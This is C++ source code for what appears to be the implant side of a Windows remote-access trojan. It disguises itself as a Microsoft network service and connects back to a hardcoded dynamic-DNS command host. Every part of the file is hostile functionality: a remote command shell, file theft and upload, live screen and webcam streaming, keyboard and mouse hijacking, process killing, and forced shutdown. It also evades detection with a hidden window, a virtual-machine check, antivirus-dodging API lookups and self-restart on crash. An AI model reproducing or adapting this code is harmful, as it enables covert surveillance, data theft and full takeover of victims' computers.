#include "stdafx.h"
#include "svchost.h"

#pragma comment(lib, "msvcrt.lib")
#pragma comment(linker,"/NODEFAULTLIB:libcmt.lib")
#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
//#pragma comment(linker,"/ENTRY:WinMain")

#define DE
#include "../../debug.h"

#define LxProc
#define LxFile
#define LxScreem
//#define LxUrl
//#define LxDown
//#define LxPower
//#define LxVideo
//#define LxVM
#define Lxform

#define vipid 405

struct MODIFY_DATA
{
    char  strIPFile[128];   //ip�ļ�or DNS						0
	char  strVersion[16];   //����˰汾						128
	DWORD dwVipID;          //VIP ID							144
	BOOL  bReplace;         //TRUE-�滻����FALSE-�½�����		148
	char  strSvrName[32];   //��������							149
	char  strSvrDisp[100];  //������ʾ							181
	char  strSvrDesc[100];  //��������							281
	char  ServerAddr[100];	//Client Addr						381
	int   ServerPort;		//Client port						481
}modify_data =
{
    "botovinik.vicp.net:80",
    "150614",
	vipid,
	FALSE,
    "WinNetCenter",
    "Microsoft(R) Multi Protocol Network Control Center",
    "Provides supports for multi network Protocol. This service can't be stopped.",
    "192.168.1.145",
    80,
};

SOCKET MainSocket;

unsigned long _stdcall resolve(char *host)
{
    struct hostent *ser = NULL;

	long i = inet_addr(host);
	
    if (i < 0) //Not Ip
    {
		ser = (struct hostent*)gethostbyname(host);

        if (ser == NULL)
        {
        	ser = (struct hostent*)gethostbyname(host); //retry
        }
		
		if (ser != NULL)
        {
        	return (*(unsigned long *)ser->h_addr);
        }
		
		return 0;  
    }

    return i;
}

DWORD _stdcall ConnectThread(LPVOID lParam)
{
	SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );

    struct sockaddr_in LocalAddr;
    LocalAddr.sin_family = AF_INET;
    LocalAddr.sin_port = htons(modify_data.ServerPort);
    LocalAddr.sin_addr.S_un.S_addr = resolve(modify_data.ServerAddr);

    MainSocket = socket(AF_INET, SOCK_STREAM, 0); //���ӵ�socket
	
	int timeout = 45000;
	int err = setsockopt(MainSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
  		
    if (connect(MainSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
    {
        MsgErr("Can't Connect");
#ifndef DE
		Sleep(30000);
#endif
        return 0;//connect error
    }
    else
    {
        TurnonKeepAlive(MainSocket, 120);
    }

    SysInfo m_SysInfo;
    GetSystemInfo(m_SysInfo);//��ȡϵͳ��Ϣ
    m_SysInfo.iVipID = modify_data.dwVipID;
    m_SysInfo.bVideo = true; //CVideoCap::IsWebCam();
    lstrcpy(m_SysInfo.cVersion, modify_data.strVersion);
    EncryptData((unsigned char *)&m_SysInfo, sizeof(SysInfo), modify_data.dwVipID);	//�ò�ƷID�ż���

    //send socket type
    MsgHead msgHead;
    char chBuffer[4096];

    msgHead.dwCmd = SOCKET_CONNECT;//�����Ϣ
    msgHead.dwSize = sizeof(SysInfo);

    memcpy(chBuffer, &m_SysInfo, sizeof(SysInfo));//��䱻�ض���Ϣ

    if ( !SendMsg(MainSocket, (char *)&m_SysInfo, &msgHead) )
    {
        MsgErr("Can't Send");
        closesocket(MainSocket);
        return 1; //send socket type error
    }

    while (1)	//��������
    {
        if ( !RecvMsg(MainSocket, (char *)chBuffer, &msgHead))	//���ߣ�����
        {
            MsgErr("Can't Recv");
            shutdown(MainSocket, 0x02);
            closesocket(MainSocket);
            break;
        }

        switch (msgHead.dwCmd)	//��������
        {
			case CMD_FILEMANAGE:
			{
#ifdef LxFile
				CreateThread(NULL, NULL, FileManageThread, NULL, NULL, NULL);//��һ���ļ�������߳�
#endif
			}
			break;

			case CMD_SCREENSTART:
			{
#ifdef LxScreem
				DWORD dwSock = msgHead.dwExtend1;	//��ȡ���ߵ�socket==DWORD
				CreateThread(NULL, NULL, ScreenThread, (LPVOID)dwSock, NULL, NULL);      //��һ����Ļ������߳�
#endif
			}
			break;

			case CMD_PROCESSSTART:
			{
#ifdef LxProc
				CreateThread(NULL, NULL, ProcessThread, NULL, NULL, NULL);    //��һ�����̹�����߳�
#endif
			}
			break;

			case CMD_SHELLSTART:
			{
				CreateThread(NULL, NULL, ShellThread, NULL, NULL, NULL);        //��һ��Զ��Shell���߳�
			}
			break;

			case CMD_VIDEOSTART:
			{
#ifdef LxVideo
				CreateThread(NULL, NULL, VideoThread, NULL, NULL, NULL);        //��һ����Ƶ��׽���߳�
#endif
			}
			break;

			case CMD_HEARTBEAT:	//������
			{
				//�����������������������Ϊ���ƶ˻���Ҳ�Ƕ�ʱ����
			}
			break;

			case CMD_UNINSTALL:	//ж��
			{
				shutdown(MainSocket, 0x02);
				closesocket(MainSocket);
				ExitProcess(0);
			}
			break;

			case CMD_RESTART:
			{
				//Todo
			}
			break;

#ifdef LxPower
			case CMD_POWEROFF:	//�ػ�
			{
				SetPrivilege(SE_SHUTDOWN_NAME);
				ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0);
			}
			break;

			case CMD_REBOOT:	//����
			{
				SetPrivilege(SE_SHUTDOWN_NAME);
				ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
			}
			break;

			case CMD_LOGOFF:	//ע��
			{
				SetPrivilege(SE_SHUTDOWN_NAME);
				ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0);
			}
			break;
#endif

			case CMD_DOWNEXEC:	//����ִ��
			{
#ifdef LxDown
				char strUrl[256];
				memset(strUrl, 0, 256);
				lstrcpyn(strUrl, chBuffer, msgHead.dwSize);
				DownExec(strUrl);
#endif
			}
			break;

			case CMD_OPENURL:	//����ҳ
			{
#ifdef LxUrl
				char strUrl[256];
				memset(strUrl, 0, 256);
				lstrcpyn(strUrl, chBuffer, msgHead.dwSize);
				OpenUrl(strUrl);
#endif
			}
			break;

#ifdef LxScreem
			case CMD_CTRLALTDEL:	// Ctrl + Alt + del
			{
				WinExec("taskmgr.exe", SW_NORMAL);
			}
			break;

			case CMD_KEYDOWN:	//WM_KEYDOWN
			{
			    //OpenUserDesktop();
			    int nVirtKey = msgHead.dwExtend1;
			    keybd_event((BYTE)nVirtKey, 0, 0, 0);
			}
			break;

			case CMD_KEYUP:	//WM_KEYUP
			{
			    //OpenUserDesktop();
				int nVirtKey = msgHead.dwExtend1;
			    keybd_event((BYTE)nVirtKey, 0, KEYEVENTF_KEYUP, 0);
			}
			break;

			case CMD_MOUSEMOVE:	//WM_MOUSEMOVE
			{
			    //OpenUserDesktop();
			    POINT pt;
			    pt.x = msgHead.dwExtend1;
			    pt.y = msgHead.dwExtend2;
			    SetCursorPos(pt.x, pt.y);
			}
			break;

			case CMD_LBUTTONDOWN:	//WM_LBUTTONDOWN
			{
				//OpenUserDesktop();
	            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
		    }
			break;

	        case CMD_LBUTTONUP:	//WM_LBUTTONUP
		    {
			    //OpenUserDesktop();
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
	        }
		    break;

			case CMD_LBUTTONDBLCLK:	//WM_LBUTTONDBLCLK
	        {
		        //OpenUserDesktop();
			    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
	            mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		        mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			}
	        break;

		    case CMD_RBUTTONDOWN:	//WM_RBUTTONDOWN
			{
				//OpenUserDesktop();
	            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
		    }
			break;

	        case CMD_RBUTTONUP:	//WM_RBUTTONUP
		    {
			    //OpenUserDesktop();
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
	        }
		    break;

			case CMD_RBUTTONDBLCLK:	//WM_RBUTTONDBLCLK
	        {
		        //OpenUserDesktop();
			    mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
	            mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
		    }
			break;
#endif
			default:
				break;
        }
    }

    return 10;
}

//////////////////////////////////////////////////////////////////////////////////
//�ļ������߳�
DWORD _stdcall FileManageThread(LPVOID lParam)
{
    struct sockaddr_in LocalAddr;
    LocalAddr.sin_family=AF_INET;
    LocalAddr.sin_port=htons(modify_data.ServerPort);
    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);

    SOCKET FileSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(FileSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
    {
        closesocket(FileSocket);
        return 0;	//connect error
    }

    //================================================================================
    MsgHead msgHead;
    char *chBuffer = new char[2048 * 1024]; //���ݽ�����

    //send socket type
    msgHead.dwCmd = SOCKET_FILEMANAGE;
    msgHead.dwSize = 0;
    if (!SendMsg(FileSocket, chBuffer, &msgHead))
    {
        if (chBuffer != NULL)
            delete []chBuffer;

        closesocket(FileSocket);
        return 0;//send socket type error
    }

    while (1)
    {
        //��������
        if (!RecvMsg(FileSocket, chBuffer, &msgHead))
            break;

        //��������
        switch (msgHead.dwCmd)
        {
        case CMD_FILEDRIVER://��ȡ������
			{
				FileListDirver(chBuffer, &msgHead);
			}
			break;
        case CMD_FILEDIRECTORY:
			{
				FileListDirectory(chBuffer, &msgHead);
			}
			break;
        case CMD_FILEDELETE:
			{
				FileDelete(chBuffer, &msgHead);
			}
			break;
        case CMD_FILEEXEC://ִ��
			{
				FileExec(chBuffer, &msgHead);
			}
			break;
        case CMD_FILEPASTE://ճ��
			{
				FilePaste(chBuffer, &msgHead);
			}
			break;
        case CMD_FILERENAME://������
			{
				FileReName(chBuffer, &msgHead);
			}
			break;
        case CMD_FILEDOWNSTART://���ؿ�ʼ
			{
				FileOpt m_FileOpt;
				memcpy(&m_FileOpt, chBuffer, sizeof(m_FileOpt));
				
				if (CreateThread(NULL, NULL, FileDownThread, (LPVOID)&m_FileOpt, NULL, NULL) != NULL)
					msgHead.dwCmd  = CMD_SUCCEED;
				else
					msgHead.dwCmd  = CMD_FAILED;
				msgHead.dwSize = 0;
			}
			break;
        case CMD_FILEUPSTART://�ϴ���ʼ
			{
				FileOpt m_FileOpt;
				memcpy(&m_FileOpt,chBuffer,sizeof(m_FileOpt));
				
				if (CreateThread(NULL,NULL,FileUpThread,(LPVOID)&m_FileOpt,NULL,NULL) != NULL)
					msgHead.dwCmd  = CMD_SUCCEED;
				else
					msgHead.dwCmd  = CMD_FAILED;
				msgHead.dwSize = 0;
			}
			break;
        default:
			{
				msgHead.dwCmd = CMD_INVALID;
				msgHead.dwSize = 0;
			}
        break;
        }

        //��������
        if (!SendMsg(FileSocket, chBuffer, &msgHead))
            break;
    }

    if (chBuffer != NULL)
        delete[] chBuffer;

	shutdown(FileSocket, 0);
    closesocket(FileSocket);
    return 0;
}

DWORD _stdcall ScreenThread(LPVOID lParam)
{	
    DWORD dwSock = (DWORD)lParam;

    struct sockaddr_in LocalAddr;
    LocalAddr.sin_family = AF_INET;
    LocalAddr.sin_port = htons(modify_data.ServerPort);
    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);

    //��Ļ��ص�socket
    SOCKET ScreenSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(ScreenSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
    {
        return 0;	//connect error
    }
    else
    {
        //���÷��ͻ�����,��������Ļ����
        int rcvbuf = 65536; //64KB
        int rcvbufsize = sizeof(int);
        setsockopt(ScreenSocket, SOL_SOCKET,SO_SNDBUF, (char*)&rcvbuf, rcvbufsize);
        int bNodelay = 1;
        setsockopt(ScreenSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//��������ʱ�㷨   
    }

    SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );

    MsgHead msgHead;
    int nColor = 8;
    //send socket type
    msgHead.dwCmd = SOCKET_SCREEN;
    msgHead.dwSize = 0;
    msgHead.dwExtend1 = dwSock;
    if (!SendMsg(ScreenSocket, NULL, &msgHead) || !RecvMsg(ScreenSocket, NULL, &msgHead) )//Get Screen Color
    {
		shutdown(ScreenSocket,0);
        closesocket(ScreenSocket);
        return 0;//send socket type error
    }
    else
    {
        nColor = msgHead.dwExtend1;
    }

    ////////////////////////////////////////
    XScreenXor m_ScreenXor;
    m_ScreenXor.SetColor(nColor);//����λͼ��ɫ
    m_ScreenXor.InitGlobalVar();

    msgHead.dwCmd = SOCKET_SCREEN;
    msgHead.dwSize = 0;
    msgHead.dwExtend1 = m_ScreenXor.GetBmpSize();
    msgHead.dwExtend2 = m_ScreenXor.GetInfoSize();
    //����λͼ��Ϣ
    if (!SendMsg(ScreenSocket, NULL, &msgHead))
    {
		shutdown(ScreenSocket,0);
        closesocket(ScreenSocket);
        return 0;//send socket type error
    }

    DWORD dwFrameID = 0, dwLastSend;
    BOOL  bNotStop = TRUE;
    DWORD lenthUncompress = m_ScreenXor.GetBmpSize();
    DWORD lenthCompress = compressBound(lenthUncompress); //(DWORD)((lenthUncompress+12)*1.1);
    BYTE* pDataCompress = new BYTE [lenthCompress];

	///////////////////////first///////////////////////////
	dwLastSend = GetTickCount();
	
	lenthCompress = compressBound(lenthUncompress); //(unsigned long)((lenthUncompress+12)*1.1);
	m_ScreenXor.CaputreFrameFirst(0);                                        //ץȡ��ǰ֡
	Sleep(15);
	::compress(pDataCompress, &lenthCompress, m_ScreenXor.GetBmpData(), lenthUncompress);
	
	msgHead.dwCmd     = dwFrameID++;              //��ǰ֡��
	msgHead.dwSize    = lenthCompress;            //��������ݳ���
	msgHead.dwExtend1 = m_ScreenXor.GetBmpSize(); //ԭʼ����
	msgHead.dwExtend2 = lenthCompress;            //ѹ���󳤶�
	
	bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead);

    while (bNotStop)
    {
        dwLastSend = GetTickCount();

        lenthCompress = compressBound(lenthUncompress); //(unsigned long)((lenthUncompress+12)*1.1);
        m_ScreenXor.CaputreFrameNext(dwFrameID);
        Sleep(15);
        ::compress(pDataCompress, &lenthCompress, m_ScreenXor.GetBmpData(), lenthUncompress);

        msgHead.dwCmd     = dwFrameID++;              //��ǰ֡��
        msgHead.dwSize    = lenthCompress;            //��������ݳ���
        msgHead.dwExtend1 = m_ScreenXor.GetBmpSize(); //ԭʼ����
        msgHead.dwExtend2 = lenthCompress;            //ѹ���󳤶�

        bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead); //��������

        if ((GetTickCount() - dwLastSend) < 160)
            Sleep(150);
    }

    //Release Mem and Handle
	shutdown(ScreenSocket,0);
    closesocket(ScreenSocket);
    delete [] pDataCompress;

    return 0;
}

#ifdef LxVideo
DWORD _stdcall VideoThread(LPVOID lParam)
{
    struct sockaddr_in LocalAddr;
    LocalAddr.sin_family=AF_INET;
    LocalAddr.sin_port=htons(modify_data.ServerPort);
    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);

    SOCKET VideoSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(VideoSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
    {
        return 0;//connect error
    }
    else
    {
        //���÷��ͻ�����,��������Ƶ����
        int rcvbuf = 65536; //64KB
        int rcvbufsize = sizeof(int);
        setsockopt(VideoSocket, SOL_SOCKET, SO_SNDBUF, (char*)&rcvbuf, rcvbufsize);
        int bNodelay = 1;
        setsockopt(VideoSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//��������ʱ�㷨   
    }

    //==================================================================
    MsgHead msgHead;
    //send socket type
    msgHead.dwCmd = SOCKET_VIDEOCAP;
    msgHead.dwSize = 0;
    if (!SendMsg(VideoSocket, NULL, &msgHead))
    {
		shutdown(VideoSocket,0);
        closesocket(VideoSocket);
        return 0;//send socket type error
    }

    ///////////////////////////////////////////////
    //Send BITMAPINFO or error code
    if (!CVideoCap::IsWebCam())    //�豸�����ڻ�����ʹ��
    {
        msgHead.dwCmd = 1;
        msgHead.dwSize = 0;
        SendMsg(VideoSocket, NULL, &msgHead);
        shutdown(VideoSocket,0x02);
        closesocket(VideoSocket);
        return 1;//send socket type error
    }

    CVideoCap m_Cap;
    if (!m_Cap.Initialize())   //�豸��ʼ��ʧ��
    {
        msgHead.dwCmd = 2;
        msgHead.dwSize = 0;
        SendMsg(VideoSocket, NULL, &msgHead);
        shutdown(VideoSocket,0x02);
        closesocket(VideoSocket);
        return 2;
    }

    msgHead.dwCmd  = 0;
    msgHead.dwSize = sizeof(BITMAPINFOHEADER);
    if (!SendMsg(VideoSocket, (char*)&(m_Cap.m_lpbmi->bmiHeader), &msgHead))
    {
    	shutdown(VideoSocket,0);
        closesocket(VideoSocket);
        return 3;//send socket type error
    }

    DWORD dwFrameID = 0,dwLastSend;
    BOOL  bNotStop = TRUE;
    DWORD lenthUncompress = m_Cap.m_lpbmi->bmiHeader.biSizeImage - 5;//Ϊɶ-5����
    DWORD lenthCompress = (unsigned long)((lenthUncompress+12)*1.1);
    BYTE* pDataCompress = new BYTE [lenthCompress];

    while (bNotStop)
    {
        dwLastSend = GetTickCount();//������ɱ

        lenthCompress = (unsigned long)((lenthUncompress+12)*1.1);                   //���������
        ::compress(pDataCompress,                                   //ѹ������
                   &lenthCompress,
                   (BYTE*)m_Cap.GetDIB(),
                   lenthUncompress);

        msgHead.dwCmd     = dwFrameID++;            //֡��
        msgHead.dwSize    = lenthCompress;          //��������ݳ���
        msgHead.dwExtend1 = lenthUncompress;        //δѹ�����ݳ���
        msgHead.dwExtend2 = lenthCompress;          //ѹ�������ݳ���

        bNotStop = SendMsg(VideoSocket, (char*)pDataCompress, &msgHead); //��������

        if ((GetTickCount() - dwLastSend) < 100)
            Sleep(80);
    }

    if (pDataCompress != NULL)
        delete[] pDataCompress;

    return 10;
}
#endif

/////////////////////////////////////////////////////////////////////////////////
//���̹����߳�
DWORD _stdcall ProcessThread(LPVOID lParam)
{
    struct sockaddr_in LocalAddr;
    LocalAddr.sin_family=AF_INET;
    LocalAddr.sin_port=htons(modify_data.ServerPort);
    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);

    SOCKET ProcessSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(ProcessSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)	//connect error
    {
    	shutdown(ProcessSocket,0x02);
        closesocket(ProcessSocket);
        return 0;
    }

    //================================================================================
    MsgHead msgHead;
    char chBuffer[32 * 1024]; //���ݽ�����

    //send socket type
    msgHead.dwCmd = SOCKET_PROCESS;
    msgHead.dwSize = 0;
    if (!SendMsg(ProcessSocket, chBuffer, &msgHead))
    {
		shutdown(ProcessSocket,0);
        closesocket(ProcessSocket);
        return 0;//send socket type error
    }

    while (1)	//��������
    {
        if (!RecvMsg(ProcessSocket, chBuffer, &msgHead))
            break;

        switch (msgHead.dwCmd)	//��������
        {
        	case CMD_PROCESSLIST:
        	{
        	    ProcessList(chBuffer, &msgHead);
        	}
        	break;
        	case CMD_PROCESSKILL:
        	{
        	    ProcessKill(chBuffer, &msgHead);
        	}
        	break;
        	default:
        	{
        	    msgHead.dwCmd = CMD_INVALID;
        	    msgHead.dwSize = 0;
        	}
        	break;
        }

        if (!SendMsg(ProcessSocket, chBuffer, &msgHead))	//��������
            break;
    }

	shutdown(ProcessSocket,0);
    closesocket(ProcessSocket);
    return 0;
}
//////////////////////////////////////////////////////////////////////////////////
//Զ��shell�߳�
DWORD _stdcall ShellThread(LPVOID lParam)
{
    struct sockaddr_in LocalAddr;
    LocalAddr.sin_family=AF_INET;
    LocalAddr.sin_port=htons(modify_data.ServerPort);
    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);

    SOCKET ShellSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(ShellSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
    {
    	shutdown(ShellSocket,0);
        closesocket(ShellSocket);
        return 0;//connect error
    }

    //====================================================================
    MsgHead msgHead;
    char *chBuffer = new char[512 * 1024]; //���ݽ����� 512KB

    //send socket type
    msgHead.dwCmd = SOCKET_CMDSHELL;
    msgHead.dwSize = 0;
    if (!SendMsg(ShellSocket, chBuffer, &msgHead))
    {
		shutdown(ShellSocket,0x02);
        closesocket(ShellSocket);
        return 0;//send socket type error
    }

    while (1)	//��������
    {        
        if (!RecvMsg(ShellSocket, chBuffer, &msgHead))
            break;

        switch (msgHead.dwCmd)	//��������
        {
        case CMD_SHELLRUN:
			{
				DOSShell(chBuffer, &msgHead);
			}
			break;
        default:
            break;
		}
		        
        if (!SendMsg(ShellSocket, chBuffer, &msgHead))	//��������
            break;
    }

    if (chBuffer != NULL)
        delete[] chBuffer;
	
	shutdown(ShellSocket,0);
    closesocket(ShellSocket);
    return 0;
}

//////////////////////////////////////////////////////////////////////////////////
//�ļ��ϴ�����
DWORD _stdcall FileDownThread(LPVOID lParam)
{
    FileOpt m_FileOpt;
    memcpy(&m_FileOpt,(FileOpt*)lParam,sizeof(FileOpt));

    struct sockaddr_in LocalAddr;
    LocalAddr.sin_family=AF_INET;
    LocalAddr.sin_port=htons(modify_data.ServerPort);
    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);

    SOCKET FileSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(FileSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
    {
    	shutdown(FileSocket,0x02);
        closesocket(FileSocket);
        return 0;//connect error
    }

    MsgHead msgHead;
    //send socket type
    msgHead.dwCmd = SOCKET_FILEDOWN;
    msgHead.dwSize = 0;
    if (!SendMsg(FileSocket, NULL, &msgHead))
    {
    	shutdown(FileSocket,0);
        closesocket(FileSocket);
        return 0;//send socket type error
    }

    //////////////////////////////////////////////////////
    HANDLE hDownFile = INVALID_HANDLE_VALUE;
    DWORD  dwDownFileSize = 0, dwBytes;
    BYTE   SendBuffer[4096];
    int nRet =0 ;

    //get download data
    hDownFile = CreateFile(m_FileOpt.cScrFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hDownFile == INVALID_HANDLE_VALUE)//CMD_READFILEEOR
        dwDownFileSize  = 0;
    else
        dwDownFileSize = GetFileSize(hDownFile, NULL);

    m_FileOpt.iSize = dwDownFileSize;
    //send file message
    if (send(FileSocket, (char *)&m_FileOpt, sizeof(FileOpt), 0) <=0 || dwDownFileSize <= 0)
    {
        shutdown(FileSocket,0x02);
        closesocket(FileSocket);
        return 1;//send socket type error
    }
    //��NOD32����ɱ��
    HINSTANCE hInst = LoadLibraryW(L"kernel32.dll");
    if (hInst == NULL)
    {
        closesocket(FileSocket);
        return 0;//send socket type error
    }
    typedef BOOL (WINAPI *pReadFile)(
        HANDLE hFile,
        LPVOID lpBuffer,
        DWORD nNumberOfBytesToRead,
        LPDWORD lpNumberOfBytesRead,
        LPOVERLAPPED lpOverlapped
    );
    pReadFile MyReadFile = (pReadFile)GetProcAddress(hInst, "ReadFileA");

    //ѭ�������ļ�����
    while (dwDownFileSize > 0)
    {
        if (MyReadFile)
        {
            if ( !MyReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL) )
                break;
        }
        else if ( !ReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL) )
		{
			break;
        }

        if ( send(FileSocket, (char*)&SendBuffer, dwBytes, 0) <= 0 )
            break;
        dwDownFileSize -= dwBytes;

    }
    if (hInst)
        FreeLibrary(hInst);
        
    CloseHandle(hDownFile);
    shutdown(FileSocket, 0x02);
    closesocket(FileSocket);

    return 10;
}

DWORD _stdcall FileUpThread(LPVOID lParam)
{
    FileOpt m_FileOpt;
    memcpy(&m_FileOpt,(FileOpt*)lParam,sizeof(FileOpt));

    struct sockaddr_in LocalAddr;
    LocalAddr.sin_family=AF_INET;
    LocalAddr.sin_port=htons(modify_data.ServerPort);
    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);

    SOCKET FileSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(FileSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
    {
    	shutdown(FileSocket,0);
        closesocket(FileSocket);
        return 0;//connect error
    }

    int iOutTime = 60000;//60�볬ʱ
    setsockopt(FileSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&iOutTime, sizeof(int));

    MsgHead msgHead;
    //send socket type
    msgHead.dwCmd = SOCKET_FILEUP;
    msgHead.dwSize = 0;
    if (!SendMsg(FileSocket, NULL, &msgHead))
    {
    	shutdown(FileSocket,0);
        closesocket(FileSocket);
        return 0;//send socket type error
    }

    //////////////////////////////////////////////////////
    HANDLE hUpFile = INVALID_HANDLE_VALUE;
    DWORD  dwUpFileSize = 0, dwBufSize = 4096, dwBytes;
    BYTE   RecvBuffer[4096];
    int nRet =0 ;

    //get download data
    hUpFile = CreateFile(m_FileOpt.cScrFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hUpFile == INVALID_HANDLE_VALUE)//CMD_READFILEEOR
        dwUpFileSize  = 0;
    else
        dwUpFileSize = 100;

    m_FileOpt.iSize = dwUpFileSize;
    //send file message
    if (send(FileSocket, (char *)&m_FileOpt, sizeof(FileOpt), 0) <=0 || dwUpFileSize <= 0)
    {
        shutdown(FileSocket,0x02);
        closesocket(FileSocket);
        return 1;//send socket type error
    }

    while (TRUE)
    {
        nRet = recv(FileSocket, (char*)&RecvBuffer, dwBufSize, 0);
        if (nRet <= 0)
            break;
        WriteFile(hUpFile, RecvBuffer, nRet, &dwBytes, NULL);
    }

    CloseHandle(hUpFile);
    shutdown(FileSocket,0x02);
    closesocket(FileSocket);

    return 10;
}

LONG _stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
{
	char SelfPath[128];
	GetModuleFileName(GetModuleHandle(NULL), SelfPath, 128);
	WinExec(SelfPath, 0);

	//return EXCEPTION_CONTINUE_EXECUTION;
	return EXCEPTION_EXECUTE_HANDLER;
}

int WINAPI WinMain(HINSTANCE hInstance,
                   HINSTANCE hPrevInstance,
                   LPSTR     lpCmdLine,
                   int       nCmdShow)
{
#ifdef LxScreem
	OpenUserDesktop();
#endif

#ifdef Lxform
    HWND hwnd = CreateWindowExW(
    			   WS_EX_APPWINDOW,
                   L"#32770",
                   L"WindowsNet",
                   WS_OVERLAPPEDWINDOW,
                   0,
                   0,
                   100,
                   100,
                   HWND_DESKTOP,
                   NULL,
                   hInstance,
                   NULL
               );

	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);
#endif

#ifdef LxVM
	_asm
    {
        RDTSC
        xchg                 ecx, eax
        RDTSC
        sub                eax, ecx
        cmp                eax, 0FFh
		jl                OK
        xor eax,eax
        push eax
        call ExitProcess
    }
OK:
#endif

	modify_data.ServerPort = 80;
	lstrcpy(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
	
	SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );
	
	WSADATA lpWSAData;
	WSAStartup(MAKEWORD(2, 2), &lpWSAData);
	
	SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER(Errdo));

	while (1)
    {
    	__try
    	{
	    	ConnectThread(NULL);
	    }
		__except(1){}
	}

    WSACleanup();

    return 0;
}
